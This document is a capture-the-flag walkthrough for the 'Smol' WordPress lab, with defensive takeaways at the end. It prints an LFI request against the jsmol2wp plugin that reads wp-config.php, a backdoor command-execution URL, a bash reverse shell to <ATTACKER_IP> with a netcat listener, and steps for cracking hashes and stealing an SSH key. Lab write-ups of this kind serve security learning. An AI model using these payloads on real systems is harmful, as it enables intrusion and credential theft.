# Smol — Quick Reference Notes

> Flags and recovered secrets are intentionally omitted.

## Target setup

```bash
export TARGET_IP="<LAB_IP>"
export HOST="www.smol.thm"
echo "$TARGET_IP  $HOST" | sudo tee -a /etc/hosts
```

## Recon

```bash
nmap -sV -p- -T4 "$TARGET_IP"
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u "http://$HOST/FUZZ" -fc 404 -c
wpscan --url "http://$HOST/"
```

Key observations from the evidence: SSH/HTTP exposure, WordPress paths, and the `jsmol2wp` plugin at version 1.07.

## LFI

The vulnerable `jsmol.php` endpoint accepts a `query` parameter. The lab path uses a PHP stream wrapper to reach `wp-config.php` outside the plugin directory.

```text
http://HOST/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

Use the configuration only to establish lab context; keep recovered passwords out of published notes.

## Backdoor → RCE

Read the suspicious `hello.php` source through the same LFI. The evidence decodes to command execution through a `cmd` request parameter.

```text
http://HOST/wp-admin/index.php?cmd=whoami
```

Expected lab context: `www-data`.

## Reverse shell

Stage a shell script from a controlled attacker host and execute it through the command primitive.

```bash
echo "/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/1234 0>&1'" > revshell.sh
python3 -m http.server 9000
nc -lnvp 1234
```

Stabilize the shell before continuing.

## Lateral movement

1. Query `wp_users` with the recovered lab database account.
2. Save a target hash and crack it offline with John.
3. Use the resulting lab credential to switch to `diego`.
4. Inspect readable home directories for reusable access paths.
5. Save the `think` user's SSH private key and use it for direct login.
6. From the `gege` context, stage `wordpress.old.zip` and transfer it to the attacker host.
7. Use `zip2john` + John to recover the archive password.
8. Extract the old WordPress tree and inspect `wp-config.php` for `xavi` credentials.

## Privilege escalation

```bash
sudo -l
sudo su
```

The evidence shows an unrestricted `(ALL : ALL) ALL` rule for `xavi`, collapsing the intended privilege boundary.

## Defensive takeaways

- Patch or remove outdated WordPress plugins.
- Validate and constrain file path parameters.
- Audit plugin source for unauthorized execution primitives.
- Treat backups and old configuration trees as sensitive assets.
- Enforce least privilege in sudoers.
- Remove world-readable private keys and rotate reused credentials.
